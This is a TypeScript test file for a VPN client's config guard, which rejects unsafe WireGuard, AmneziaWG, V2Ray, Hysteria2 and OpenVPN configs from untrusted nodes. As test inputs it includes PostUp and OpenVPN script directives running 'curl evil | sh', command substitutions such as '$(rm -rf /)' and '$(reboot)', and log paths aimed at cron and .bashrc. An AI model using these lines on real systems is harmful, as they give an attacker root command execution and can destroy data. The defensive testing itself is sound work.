import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  assertSafeWireguardConfig,
  extractWireguardEndpointHost,
  isAllowedBypassCidr,
  sanitizeBypassRoutes,
  assertSafeV2RayConfig,
  withV2RayDiagnosticLog,
  pinV2RayNodeAddresses,
  pinWireguardEndpoint,
  classifyV2RayInbound,
  filterV2RayMetadata,
  isAllCleartext,
  v2raySecurityBadge,
  withV2RayDoH,
  isSafeNodeApiUrl,
  assertSafeHysteria2Config,
  assertSafeAmneziaWgConfig,
  assertSafeOpenVpnConfig,
  extractOpenVpnRemoteHost,
} from './config-guard.ts'

// A representative clean WireGuard config built from a node handshake.
const CLEAN_WG = `[Interface]
PrivateKey = aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktYmFzZTY0PT0=
Address = 10.8.0.2/32
DNS = 10.8.0.1
MTU = 1420

[Peer]
PublicKey = c29tZS1wdWJsaWMta2V5LWluLWJhc2U2NC1mb3JtYXQ9
PresharedKey = cHNrLWtleS1iYXNlNjQtZW5jb2RlZC12YWx1ZS09PQ==
AllowedIPs = 0.0.0.0/0
Endpoint = 203.0.113.7:51820
PersistentKeepalive = 25
`

test('assertSafeWireguardConfig accepts a clean Interface/Peer config', () => {
  assert.doesNotThrow(() => assertSafeWireguardConfig(CLEAN_WG))
})

// --- Endpoint pinning ---
// Nodes advertise a hostname (BUSURNODE-AU-001's on-chain remoteAddrs is
// "helen.busur.cc:63115"), and the SDK copies it straight into Endpoint. Left
// unpinned, getWireGuardRemoteHost finds no IPv4, the kill switch whitelists
// nothing, and the DROP-all rule blackholes the tunnel's own outer UDP.
const HOSTNAME_WG = CLEAN_WG.replace('Endpoint = 203.0.113.7:51820', 'Endpoint = helen.busur.cc:63115')
const resolveWg = (host: string): string | null => (host === 'helen.busur.cc' ? '203.0.113.9' : null)

test('pinWireguardEndpoint replaces a hostname endpoint with its resolved IP', () => {
  const out = pinWireguardEndpoint(HOSTNAME_WG, resolveWg)
  assert.match(out, /^Endpoint = 203\.0\.113\.9:63115$/m)
  assert.equal(extractWireguardEndpointHost(out), '203.0.113.9')
})

test('pinWireguardEndpoint keeps every other line byte-identical', () => {
  const out = pinWireguardEndpoint(HOSTNAME_WG, resolveWg)
  const strip = (c: string) => c.split('\n').filter((l) => !l.startsWith('Endpoint')).join('\n')
  assert.equal(strip(out), strip(HOSTNAME_WG))
})

test('pinWireguardEndpoint leaves an IP endpoint untouched without resolving', () => {
  const out = pinWireguardEndpoint(CLEAN_WG, () => { throw new Error('must not resolve an IP') })
  assert.equal(out, CLEAN_WG)
})

test('pinWireguardEndpoint leaves an unresolvable hostname as-is (best effort)', () => {
  const out = pinWireguardEndpoint(HOSTNAME_WG, () => null)
  assert.equal(extractWireguardEndpointHost(out), 'helen.busur.cc')
})

test('pinWireguardEndpoint ignores a resolver that returns a non-IPv4', () => {
  const out = pinWireguardEndpoint(HOSTNAME_WG, () => 'still.a.hostname')
  assert.equal(extractWireguardEndpointHost(out), 'helen.busur.cc')
})

test('pinWireguardEndpoint leaves a bracketed IPv6 endpoint alone', () => {
  const v6 = CLEAN_WG.replace('Endpoint = 203.0.113.7:51820', 'Endpoint = [2001:db8::1]:51820')
  assert.equal(pinWireguardEndpoint(v6, () => '203.0.113.9'), v6)
})

test('pinWireguardEndpoint output still passes both root-protocol guards', () => {
  const out = pinWireguardEndpoint(HOSTNAME_WG, resolveWg)
  assert.doesNotThrow(() => assertSafeWireguardConfig(out))
  assert.doesNotThrow(() => assertSafeAmneziaWgConfig(out))
})

test('pinWireguardEndpoint cannot inject a directive through the resolver', () => {
  const evil = pinWireguardEndpoint(HOSTNAME_WG, () => '1.2.3.4\nPostUp = /bin/sh -c evil')
  assert.doesNotThrow(() => assertSafeWireguardConfig(evil))
  assert.equal(extractWireguardEndpointHost(evil), 'helen.busur.cc')
})

// The core LPE vector: wg-quick executes these directives as root.
for (const directive of ['PostUp', 'PreUp', 'PostDown', 'PreDown', 'Table', 'SaveConfig']) {
  test(`assertSafeWireguardConfig rejects ${directive} directive`, () => {
    const evil = CLEAN_WG.replace('MTU = 1420', `${directive} = /bin/sh -c "curl evil|sh"`)
    assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
  })
}

test('assertSafeWireguardConfig rejects PostUp regardless of case/spacing', () => {
  const evil = CLEAN_WG.replace('MTU = 1420', 'postup=touch /tmp/pwned')
  assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
})

test('assertSafeWireguardConfig rejects an unknown key (allow-list, not blocklist)', () => {
  const evil = CLEAN_WG.replace('MTU = 1420', 'Whatever = 7')
  assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
})

test('assertSafeWireguardConfig ignores comments and blank lines', () => {
  const withComments = `# generated\n\n${CLEAN_WG}\n# trailing comment\n`
  assert.doesNotThrow(() => assertSafeWireguardConfig(withComments))
})

test('assertSafeWireguardConfig rejects a key outside any section', () => {
  assert.throws(() => assertSafeWireguardConfig('PostUp = x\n[Interface]\nPrivateKey = a'), /not allowed|invalid/i)
})

// Value-format hardening: keep shell/control chars and garbage out of allow-listed
// keys, without rejecting legitimate SDK output.
test('assertSafeWireguardConfig accepts multi-value AllowedIPs incl. IPv6', () => {
  const cfg = CLEAN_WG.replace('AllowedIPs = 0.0.0.0/0', 'AllowedIPs = 0.0.0.0/0, ::/0')
  assert.doesNotThrow(() => assertSafeWireguardConfig(cfg))
})

test('assertSafeWireguardConfig accepts a hostname Endpoint', () => {
  const cfg = CLEAN_WG.replace('Endpoint = 203.0.113.7:51820', 'Endpoint = node.example.org:51820')
  assert.doesNotThrow(() => assertSafeWireguardConfig(cfg))
})

test('assertSafeWireguardConfig rejects a non-numeric MTU', () => {
  assert.throws(() => assertSafeWireguardConfig(CLEAN_WG.replace('MTU = 1420', 'MTU = huge')), /number|invalid/i)
})

test('assertSafeWireguardConfig rejects an Endpoint with no port / shell metacharacters', () => {
  assert.throws(() => assertSafeWireguardConfig(CLEAN_WG.replace('Endpoint = 203.0.113.7:51820', 'Endpoint = 203.0.113.7')), /host:port|invalid/i)
  assert.throws(() => assertSafeWireguardConfig(CLEAN_WG.replace('Endpoint = 203.0.113.7:51820', 'Endpoint = 203.0.113.7:22; reboot')), /host:port|invalid/i)
})

test('assertSafeWireguardConfig rejects a key value with illegal characters', () => {
  assert.throws(() => assertSafeWireguardConfig(CLEAN_WG.replace(/PrivateKey = .*/, 'PrivateKey = not a key!')), /key|invalid/i)
})

test('assertSafeWireguardConfig rejects AllowedIPs carrying a command substitution', () => {
  assert.throws(() => assertSafeWireguardConfig(CLEAN_WG.replace('AllowedIPs = 0.0.0.0/0', 'AllowedIPs = 0.0.0.0/0, $(reboot)')), /malformed|invalid/i)
})

test('extractWireguardEndpointHost returns the host before the port', () => {
  assert.equal(extractWireguardEndpointHost(CLEAN_WG), '203.0.113.7')
})

test('extractWireguardEndpointHost tolerates missing spaces around =', () => {
  assert.equal(extractWireguardEndpointHost('[Peer]\nEndpoint=198.51.100.4:1194'), '198.51.100.4')
})

test('extractWireguardEndpointHost returns null when no Endpoint present', () => {
  assert.equal(extractWireguardEndpointHost('[Interface]\nPrivateKey = a'), null)
})

// H3: split-tunnel bypass routes flow to `ip route add ... via <real gateway>` as root.
test('isAllowedBypassCidr accepts normal private CIDRs', () => {
  assert.equal(isAllowedBypassCidr('10.0.0.0/8'), true)
  assert.equal(isAllowedBypassCidr('192.168.1.0/24'), true)
  assert.equal(isAllowedBypassCidr('203.0.113.7/32'), true)
})

test('isAllowedBypassCidr rejects the default-route swallow vectors', () => {
  assert.equal(isAllowedBypassCidr('0.0.0.0/0'), false)
  assert.equal(isAllowedBypassCidr('0.0.0.0/1'), false)
  assert.equal(isAllowedBypassCidr('0.0.0.0/8'), false)
})

test('isAllowedBypassCidr rejects out-of-range octets and prefixes', () => {
  assert.equal(isAllowedBypassCidr('999.0.0.1/8'), false)
  assert.equal(isAllowedBypassCidr('10.0.0.0/33'), false)
  assert.equal(isAllowedBypassCidr('10.0.0/8'), false)
  assert.equal(isAllowedBypassCidr('10.0.0.0'), false)
  assert.equal(isAllowedBypassCidr('garbage'), false)
  assert.equal(isAllowedBypassCidr(''), false)
})

test('sanitizeBypassRoutes drops invalid entries and caps the list', () => {
  assert.deepEqual(sanitizeBypassRoutes(['10.0.0.0/8', '0.0.0.0/0', 'junk']), ['10.0.0.0/8'])
  assert.deepEqual(sanitizeBypassRoutes(['  192.168.0.0/16  ']), ['192.168.0.0/16'])
  assert.equal(sanitizeBypassRoutes(Array(200).fill('10.0.0.0/8')).length <= 64, true)
})

// M3: node-supplied probe/handshake URLs must be http(s) with no embedded creds.
test('isSafeNodeApiUrl accepts http(s) and bare host:port', () => {
  assert.equal(isSafeNodeApiUrl('https://node.example.org:8585'), true)
  assert.equal(isSafeNodeApiUrl('http://203.0.113.7:1234'), true)
  assert.equal(isSafeNodeApiUrl('203.0.113.7:8585'), true) // scheme-less → https
})

test('isSafeNodeApiUrl rejects non-http schemes, credentials, and non-strings', () => {
  assert.equal(isSafeNodeApiUrl('file:///etc/passwd'), false)
  assert.equal(isSafeNodeApiUrl('ftp://node/x'), false)
  assert.equal(isSafeNodeApiUrl('https://user:pass@node/x'), false)
  assert.equal(isSafeNodeApiUrl(''), false)
  assert.equal(isSafeNodeApiUrl(undefined), false)
  assert.equal(isSafeNodeApiUrl(42), false)
})

// C2: V2Ray config is spawned as a child process; node operators are untrusted.
const CLEAN_V2RAY = {
  log: { loglevel: 'none' },
  inbounds: [{ protocol: 'socks', listen: '127.0.0.1', port: 1080 }],
  outbounds: [
    { protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] } },
    { protocol: 'freedom' },
  ],
}

test('assertSafeV2RayConfig accepts a clean local-SOCKS / vmess config', () => {
  assert.doesNotThrow(() => assertSafeV2RayConfig(CLEAN_V2RAY))
})

test('assertSafeV2RayConfig rejects a log file path (arbitrary file write vector)', () => {
  assert.throws(() => assertSafeV2RayConfig({ ...CLEAN_V2RAY, log: { access: '/etc/cron.d/x' } }), /log|not allowed|invalid/i)
  assert.throws(() => assertSafeV2RayConfig({ ...CLEAN_V2RAY, log: { error: '/home/user/.bashrc' } }), /log|not allowed|invalid/i)
})

test('assertSafeV2RayConfig rejects an inbound bound to a non-loopback address', () => {
  const evil = { ...CLEAN_V2RAY, inbounds: [{ protocol: 'socks', listen: '0.0.0.0', port: 1080 }] }
  assert.throws(() => assertSafeV2RayConfig(evil), /loopback|listen|not allowed|invalid/i)
})

test('assertSafeV2RayConfig rejects a config with no outbounds', () => {
  assert.throws(() => assertSafeV2RayConfig({ inbounds: [] }), /outbound|invalid/i)
  assert.throws(() => assertSafeV2RayConfig(null), /invalid/i)
  assert.throws(() => assertSafeV2RayConfig('not an object'), /invalid/i)
})

// The SDK hardcodes log.loglevel = "none", so v2ray is silent and a dead
// outbound (process alive, can't reach node) is undiagnosable. Turn logging on
// without tripping the security guard's "no log file path" rule.
test('withV2RayDiagnosticLog turns logging on at warning level', () => {
  const out = withV2RayDiagnosticLog({ log: { loglevel: 'none' }, outbounds: [{ protocol: 'vmess' }] }) as { log: { loglevel: string; error: string } }
  assert.equal(out.log.loglevel, 'warning')
  // error must route to stderr ('' = stderr), NOT a file path
  assert.equal(out.log.error, '')
})

test('withV2RayDiagnosticLog output still passes the security guard', () => {
  const out = withV2RayDiagnosticLog(CLEAN_V2RAY)
  assert.doesNotThrow(() => assertSafeV2RayConfig(out))
})

test('withV2RayDiagnosticLog preserves the rest of the config and does not mutate input', () => {
  const input = JSON.parse(JSON.stringify(CLEAN_V2RAY))
  const out = withV2RayDiagnosticLog(input) as typeof CLEAN_V2RAY
  assert.deepEqual(out.outbounds, CLEAN_V2RAY.outbounds)
  assert.deepEqual(out.inbounds, CLEAN_V2RAY.inbounds)
  // input untouched (pure)
  assert.deepEqual(input.log, { loglevel: 'none' })
})

// The real-world failure: the node endpoint is a hostname (oizys.busur.cc).
// Once tun2socks routes all DNS through the tunnel, v2ray re-resolving that
// hostname deadlocks. Pinning it to an IP before spawn removes the dependency.
const HOSTNAME_V2RAY = {
  log: { loglevel: 'none' },
  outbounds: [
    { protocol: 'vmess', settings: { vnext: [{ address: 'oizys.busur.cc', port: 55215, users: [{ id: 'x' }] }] }, tag: 'grpc' },
    { protocol: 'vless', settings: { vnext: [{ address: 'oizys.busur.cc', port: 55216, users: [{ id: 'x' }] }] }, tag: 'kcp' },
  ],
}
const resolveFixed = (host: string): string | null => (host === 'oizys.busur.cc' ? '103.246.250.10' : null)

test('pinV2RayNodeAddresses replaces a hostname endpoint with its resolved IP', () => {
  const out = pinV2RayNodeAddresses(HOSTNAME_V2RAY, resolveFixed) as typeof HOSTNAME_V2RAY
  assert.equal(out.outbounds[0].settings.vnext[0].address, '103.246.250.10')
  assert.equal(out.outbounds[1].settings.vnext[0].address, '103.246.250.10')
  // unrelated fields preserved
  assert.equal(out.outbounds[0].settings.vnext[0].port, 55215)
})

test('pinV2RayNodeAddresses leaves an IP endpoint untouched', () => {
  const out = pinV2RayNodeAddresses(CLEAN_V2RAY, () => { throw new Error('must not resolve an IP') }) as typeof CLEAN_V2RAY
  assert.equal(out.outbounds[0].settings.vnext[0].address, '203.0.113.7')
})

test('pinV2RayNodeAddresses leaves an unresolvable hostname as-is (best effort)', () => {
  const out = pinV2RayNodeAddresses(HOSTNAME_V2RAY, () => null) as typeof HOSTNAME_V2RAY
  assert.equal(out.outbounds[0].settings.vnext[0].address, 'oizys.busur.cc')
})

test('pinV2RayNodeAddresses does not mutate input and output passes the guard', () => {
  const input = JSON.parse(JSON.stringify(HOSTNAME_V2RAY))
  const out = pinV2RayNodeAddresses(input, resolveFixed)
  assert.equal(input.outbounds[0].settings.vnext[0].address, 'oizys.busur.cc') // input untouched
  assert.doesNotThrow(() => assertSafeV2RayConfig(out))
})

// --- V2Ray inbound encryption policy ---
//
// VLess has no proxy-layer cipher: VLess + transport_security=none is the only
// cleartext-at-the-proxy combo. VMess (AEAD) and any TLS inbound are encrypted.
// Enum values mirror the SDK: ProxyProtocol VLess=1/VMess=2, TransportSecurity
// None=1/TLS=2, TransportProtocol TCP=7.
const VLESS = 1, VMESS = 2, SEC_NONE = 1, SEC_TLS = 2, TCP = 7
const inbound = (proxy, security) => ({
  port: '443', proxy_protocol: proxy, transport_protocol: TCP, transport_security: security,
})

test('classifyV2RayInbound: VMess and any TLS are acceptable, VLess+none is cleartext', () => {
  assert.equal(classifyV2RayInbound(inbound(VMESS, SEC_NONE)), 'acceptable') // VMess AEAD
  assert.equal(classifyV2RayInbound(inbound(VMESS, SEC_TLS)), 'acceptable')
  assert.equal(classifyV2RayInbound(inbound(VLESS, SEC_TLS)), 'acceptable') // TLS wraps it
  assert.equal(classifyV2RayInbound(inbound(VLESS, SEC_NONE)), 'cleartext')
})

test('filterV2RayMetadata keeps only acceptable inbounds when any exist', () => {
  const mixed = [inbound(VLESS, SEC_NONE), inbound(VMESS, SEC_NONE)]
  const kept = filterV2RayMetadata(mixed)
  assert.equal(kept.length, 1)
  assert.equal(kept[0].proxy_protocol, VMESS)
})

test('filterV2RayMetadata leaves an all-acceptable list intact', () => {
  const ok = [inbound(VMESS, SEC_NONE), inbound(VLESS, SEC_TLS)]
  assert.equal(filterV2RayMetadata(ok).length, 2)
})

test('filterV2RayMetadata returns [] when every inbound is VLess-none', () => {
  assert.deepEqual(filterV2RayMetadata([inbound(VLESS, SEC_NONE), inbound(VLESS, SEC_NONE)]), [])
})

test('isAllCleartext is true only for a non-empty all-cleartext set', () => {
  assert.equal(isAllCleartext([inbound(VLESS, SEC_NONE), inbound(VLESS, SEC_NONE)]), true)
  assert.equal(isAllCleartext([inbound(VLESS, SEC_NONE), inbound(VMESS, SEC_NONE)]), false)
  assert.equal(isAllCleartext([]), false)
})

test('v2raySecurityBadge produces the expected compact label', () => {
  assert.equal(v2raySecurityBadge([inbound(VMESS, SEC_TLS)]), 'VMess+TLS')
  assert.equal(v2raySecurityBadge([inbound(VMESS, SEC_NONE)]), 'VMess')
  assert.equal(v2raySecurityBadge([inbound(VLESS, SEC_TLS)]), 'VLess+TLS')
  const cleartext = v2raySecurityBadge([inbound(VLESS, SEC_NONE)])
  assert.match(cleartext, /VLess/)
  assert.match(cleartext, /⚠/)
})

test('filterV2RayMetadata does not mutate its input array', () => {
  const input = [inbound(VLESS, SEC_NONE), inbound(VMESS, SEC_TLS)]
  const snapshot = JSON.parse(JSON.stringify(input))
  filterV2RayMetadata(input)
  assert.deepEqual(input, snapshot)
})

// --- V2Ray DNS-over-HTTPS injection ---
//
// Shaped like the SDK's generated config: a tagged SOCKS "proxy" inbound, a node
// outbound, and a leastping balancer reached by an inboundTag:["proxy"] rule.
const SDK_V2RAY = {
  log: { loglevel: 'none' },
  inbounds: [
    { protocol: 'dokodemo-door', listen: '127.0.0.1', port: 12345, tag: 'api' },
    { protocol: 'socks', listen: '127.0.0.1', port: 1080, settings: { udp: true }, tag: 'proxy' },
  ],
  outbounds: [
    { protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] }, tag: 'node-0' },
  ],
  routing: {
    domainStrategy: 'IPIfNonMatch',
    balancers: [{ tag: 'balancer', selector: ['node'] }],
    rules: [
      { type: 'field', inboundTag: ['api'], outboundTag: 'api' },
      { type: 'field', inboundTag: ['proxy'], balancerTag: 'balancer' },
    ],
  },
}

test('withV2RayDoH injects a DoH dns block for a known resolver (Quad9)', () => {
  const out = withV2RayDoH(SDK_V2RAY, '9.9.9.9') as any
  assert.deepEqual(out.dns.servers, ['https://dns.quad9.net/dns-query'])
  assert.deepEqual(out.dns.hosts, { 'dns.quad9.net': ['9.9.9.9', '149.112.112.112'] })
  assert.equal(out.dns.queryStrategy, 'UseIPv4') // TUN is v4-only
  assert.equal(out.dns.tag, 'dns-module')
})

test('withV2RayDoH adds the built-in dns outbound and keeps the node outbound first', () => {
  const out = withV2RayDoH(SDK_V2RAY, '9.9.9.9') as any
  assert.equal(out.outbounds[0].tag, 'node-0') // default (first) outbound unchanged → tunnelled
  assert.deepEqual(out.outbounds[out.outbounds.length - 1], { protocol: 'dns', tag: 'dns-out' })
})

test('withV2RayDoH prepends the port-53 intercept BEFORE the proxy catch-all', () => {
  const out = withV2RayDoH(SDK_V2RAY, '9.9.9.9') as any
  // Rule order is load-bearing: client DNS must be caught before the balancer rule.
  assert.deepEqual(out.routing.rules[0], { type: 'field', inboundTag: ['proxy'], port: 53, outboundTag: 'dns-out' })
  assert.deepEqual(out.routing.rules[1], { type: 'field', inboundTag: ['dns-module'], balancerTag: 'balancer' })
  // original rules preserved after the injected ones
  assert.deepEqual(out.routing.rules.slice(2), SDK_V2RAY.routing.rules)
})

test('withV2RayDoH keys the intercept on the config own socks inbound tag', () => {
  // Regression: the intercept used to be hardcoded to inboundTag:['proxy'], which is
  // only what the SDK's v2ray config uses. buildXRayConfig and buildMultihopConfig tag
  // their socks inbound 'socks', so the rule matched nothing and DoH was silently inert.
  const xrayShaped = {
    log: { loglevel: 'warning' },
    inbounds: [{ tag: 'socks', listen: '127.0.0.1', port: 1080, protocol: 'socks', settings: { udp: true } }],
    outbounds: [{ tag: 'proxy', protocol: 'vless', settings: { vnext: [{ address: '203.0.113.9', port: 443 }] } }],
  }
  const out = withV2RayDoH(xrayShaped, '9.9.9.9') as any
  assert.deepEqual(out.routing.rules[0], { type: 'field', inboundTag: ['socks'], port: 53, outboundTag: 'dns-out' })
  // With no balancer, DNS egresses via the first outbound — for a chain that is the exit hop.
  assert.deepEqual(out.routing.rules[1], { type: 'field', inboundTag: ['dns-module'], outboundTag: 'proxy' })
})

test('withV2RayDoH never intercepts the SDK dokodemo-door api inbound', () => {
  // The intercept is prepended, so pulling in the 'api' tag would hijack v2ray's own
  // API port ahead of the rule that routes it to outboundTag 'api'.
  const out = withV2RayDoH(SDK_V2RAY, '9.9.9.9') as any
  assert.deepEqual(out.routing.rules[0].inboundTag, ['proxy'])
  assert.ok(!out.routing.rules[0].inboundTag.includes('api'))
})

test('withV2RayDoH maps both Cloudflare IPs to the same DoH host', () => {
  const out = withV2RayDoH(SDK_V2RAY, '1.0.0.1') as any
  assert.deepEqual(out.dns.servers, ['https://cloudflare-dns.com/dns-query'])
  assert.deepEqual(out.dns.hosts, { 'cloudflare-dns.com': ['1.1.1.1', '1.0.0.1'] })
})

test('withV2RayDoH returns the config unchanged for system/unknown resolver', () => {
  assert.equal(withV2RayDoH(SDK_V2RAY, 'system'), SDK_V2RAY)
  assert.equal(withV2RayDoH(SDK_V2RAY, '8.8.4.4'), SDK_V2RAY) // not in the DoH map
})

test('withV2RayDoH falls back to the first outbound tag when there is no balancer', () => {
  const noBalancer = {
    outbounds: [{ protocol: 'vmess', tag: 'node-0' }],
    routing: { rules: [{ type: 'field', inboundTag: ['proxy'], outboundTag: 'node-0' }] },
  }
  const out = withV2RayDoH(noBalancer, '9.9.9.9') as any
  assert.deepEqual(out.routing.rules[1], { type: 'field', inboundTag: ['dns-module'], outboundTag: 'node-0' })
})

test('withV2RayDoH does not mutate input and output passes the security guard', () => {
  const input = JSON.parse(JSON.stringify(SDK_V2RAY))
  const out = withV2RayDoH(input, '9.9.9.9')
  // input untouched (pure)
  assert.equal('dns' in input, false)
  assert.equal(input.outbounds.length, 1)
  assert.equal(input.routing.rules.length, 2)
  // injected DoH config is still safe to spawn
  assert.doesNotThrow(() => assertSafeV2RayConfig(out))
})

// --- Hysteria2 config guard ---

const HY2_PIN = 'b3:7a:2f:9c:1d:44:e8:05:6a:cc:91:0f:23:5e:88:d1:47:b0:9a:3c:6e:12:fd:84:55:aa:e1:38:7c:90:2b:6f'
const CLEAN_HY2 = {
  server: '203.0.113.10:34567',
  auth: '11111111-2222-3333-4444-555555555555',
  tls: { insecure: true, pinSHA256: HY2_PIN },
  socks5: { listen: '127.0.0.1:1080' },
  lazy: true,
}

test('assertSafeHysteria2Config accepts a clean synthesized config', () => {
  assert.doesNotThrow(() => assertSafeHysteria2Config(CLEAN_HY2))
})

test('assertSafeHysteria2Config rejects a non-loopback SOCKS5 listener (open proxy)', () => {
  assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, socks5: { listen: '0.0.0.0:1080' } }), /loopback/)
})

test('assertSafeHysteria2Config rejects a missing or malformed TLS pin', () => {
  assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, tls: { insecure: true } }), /pinSHA256/)
  assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, tls: { insecure: true, pinSHA256: 'nope' } }), /MITM-able/)
})

test('assertSafeHysteria2Config rejects traffic-redirecting keys and bad server', () => {
  assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, outbounds: [{}] }), /outbounds.*not allowed/)
  assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, acl: { inline: [] } }), /acl.*not allowed/)
  assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, server: 'no-port' }), /host:port/)
})

// --- AmneziaWG config guard ---

// A representative clean AmneziaWG config as amneziawg-config.ts builds it.
const CLEAN_AWG = `[Interface]
Address = 10.8.0.5/32,fd00::5/128
PrivateKey = cHJpdmF0ZSBrZXkgcHJpdmF0ZSBrZXkgcHJpdmF0ZSE=
DNS = 10.8.0.1,1.0.0.1,1.1.1.1
Jc = 4
Jmin = 128
Jmax = 800
S1 = 15
S2 = 40
S3 = 20
S4 = 10
H1 = 1234567891
H2 = 987654321
H3 = 246813579
H4 = 1357924680
I1 = <b 0xf6ab3267fd><r 16><t>

[Peer]
PublicKey = aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qga2V5IQ==
AllowedIPs = 0.0.0.0/0,::/0
Endpoint = 203.0.113.10:51820
PersistentKeepalive = 15
`

test('assertSafeAmneziaWgConfig accepts a builder-produced config', () => {
  assert.doesNotThrow(() => assertSafeAmneziaWgConfig(CLEAN_AWG))
})

// The same LPE vector as wg-quick: awg-quick executes these directives as root.
for (const directive of ['PostUp', 'PreUp', 'PostDown', 'PreDown', 'Table', 'SaveConfig']) {
  test(`assertSafeAmneziaWgConfig rejects ${directive}`, () => {
    const evil = CLEAN_AWG.replace('[Peer]', `${directive} = /bin/sh -c "curl evil | sh"\n[Peer]`)
    assert.throws(() => assertSafeAmneziaWgConfig(evil), /not allowed/)
  })
}

test('assertSafeAmneziaWgConfig rejects out-of-range obfuscation values', () => {
  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace('H1 = 1234567891', 'H1 = 99999999999')), /uint32/)
  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace('S1 = 15', 'S1 = 70000')), /uint16/)
  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace('Jc = 4', 'Jc = notanumber')), /uint16/)
})

test('assertSafeAmneziaWgConfig rejects signature packets outside the tag grammar', () => {
  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace(/I1 = .*/, 'I1 = $(rm -rf /)')), /signature packet/)
  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace(/I1 = .*/, 'I1 = <x 12>')), /signature packet/)
})

test('assertSafeWireguardConfig still rejects AmneziaWG keys (allow-lists stay separate)', () => {
  const wgWithJc = CLEAN_WG.replace('MTU = 1420', 'Jc = 4')
  assert.throws(() => assertSafeWireguardConfig(wgWithJc), /"jc".*not allowed/)
})

// --- OpenVPN config guard ---

// A representative clean config as openvpn-config.ts builds it (PEM bodies
// shortened — the guard checks shape, not cryptographic validity).
const CLEAN_OVPN = `client
dev sntl-ovpn
dev-type tun
proto udp
remote 203.0.113.10 1194
nobind
auth-nocache
auth SHA256
data-ciphers AES-256-GCM:AES-128-GCM
data-ciphers-fallback AES-256-GCM
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-256-GCM-SHA384
tls-client
tls-version-min 1.2
remote-cert-tls server
redirect-gateway def1 ipv6 bypass-dhcp
topology subnet
explicit-exit-notify 1
persist-key
persist-tun

<ca>
-----BEGIN CERTIFICATE-----
MIIBizCCATGgAwIBAgIUJRlanpHf774AH9U8QVutSO9eKu4wCgYIKoZIzj0EAwIw
-----END CERTIFICATE-----
</ca>
<cert>
-----BEGIN CERTIFICATE-----
MIIBfjCCASOgAwIBAgIUFLHnWPS7pvYXkZ2qdzUfJJNPlAwwCgYIKoZIzj0EAwIw
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg0cApCgzxt44Fs/VV
-----END PRIVATE KEY-----
</key>
<tls-crypt>
-----BEGIN OpenVPN Static key V1-----
8fb4e3efd49b79d59624c1ddc5b0669b
-----END OpenVPN Static key V1-----
</tls-crypt>
`

test('assertSafeOpenVpnConfig accepts a builder-produced config', () => {
  assert.doesNotThrow(() => assertSafeOpenVpnConfig(CLEAN_OVPN))
})

// OpenVPN's root-exec surface. Every one of these runs a command as root (or
// re-enables the ones that do), and is rejected by omission from the allow-list.
for (const directive of [
  'up', 'down', 'route-up', 'route-pre-down', 'ipchange', 'client-connect',
  'client-disconnect', 'tls-verify', 'auth-user-pass-verify', 'learn-address',
  'plugin', 'script-security', 'setenv', 'cd', 'chroot', 'daemon', 'writepid',
  'log', 'log-append', 'status', 'management', 'config', 'askpass', 'dev-node',
  'mode', 'tls-server', 'auth-user-pass', 'ca', 'cert', 'key',
]) {
  test(`assertSafeOpenVpnConfig rejects ${directive}`, () => {
    const evil = CLEAN_OVPN.replace('nobind', `${directive} /bin/sh -c "curl evil | sh"`)
    assert.throws(() => assertSafeOpenVpnConfig(evil), /not allowed/)
  })
}

test('assertSafeOpenVpnConfig rejects a script directive appended after the PKI blocks', () => {
  assert.throws(() => assertSafeOpenVpnConfig(`${CLEAN_OVPN}up /bin/sh\n`), /"up" is not allowed/)
})

test('assertSafeOpenVpnConfig pins the interface, transport and topology', () => {
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('dev sntl-ovpn', 'dev sntl0')), /"dev" has a malformed/)
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('dev-type tun', 'dev-type tap')), /"dev-type" has a malformed/)
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('proto udp', 'proto sctp')), /"proto" has a malformed/)
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('remote-cert-tls server', 'remote-cert-tls client')), /"remote-cert-tls" has a malformed/)
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('tls-version-min 1.2', 'tls-version-min 1.0')), /"tls-version-min" has a malformed/)
})

test('assertSafeOpenVpnConfig rejects shell metacharacters in a permitted value', () => {
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('remote 203.0.113.10 1194', 'remote 203.0.113.10; reboot 1194')), /"remote" has a malformed/)
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('auth SHA256', 'auth $(id)')), /"auth" has a malformed/)
})

test('assertSafeOpenVpnConfig rejects a second remote the kill switch would not whitelist', () => {
  const twoRemotes = CLEAN_OVPN.replace('nobind', 'remote 198.51.100.9 443\nnobind')
  assert.throws(() => assertSafeOpenVpnConfig(twoRemotes), /"remote" is repeated/)
})

test('assertSafeOpenVpnConfig rejects unknown or repeated inline blocks', () => {
  const evil = CLEAN_OVPN.replace('<ca>', '<tls-auth>\n-----BEGIN OpenVPN Static key V1-----\ndeadbeef\n-----END OpenVPN Static key V1-----\n</tls-auth>\n<ca>')
  assert.throws(() => assertSafeOpenVpnConfig(evil), /<tls-auth> is not allowed/)
